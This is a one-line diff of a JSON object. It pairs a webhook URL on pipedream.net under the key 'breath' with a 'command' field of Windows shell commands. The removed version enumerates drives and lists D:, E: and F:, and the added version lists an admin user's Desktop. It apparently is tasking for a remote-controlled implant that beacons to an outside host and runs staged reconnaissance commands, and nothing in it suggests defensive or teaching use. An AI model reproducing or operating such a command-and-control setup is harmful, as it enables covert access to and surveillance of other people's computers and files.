@@ -1,1 +1,1 @@
-{"breath":"https://eog70e0zwzqc91s.m.pipedream.net","command":"wmic logicaldisk get name\ncd D:\\\ndir \/a\ncd E:\\\ndir \/a\ncd F:\\\ndir \/a\necho %USERPROFILE%\\Desktop"}
+{"breath":"https://eog70e0zwzqc91s.m.pipedream.net","command":"cd C:\\Users\\admin\\Desktop\ndir \/a"}
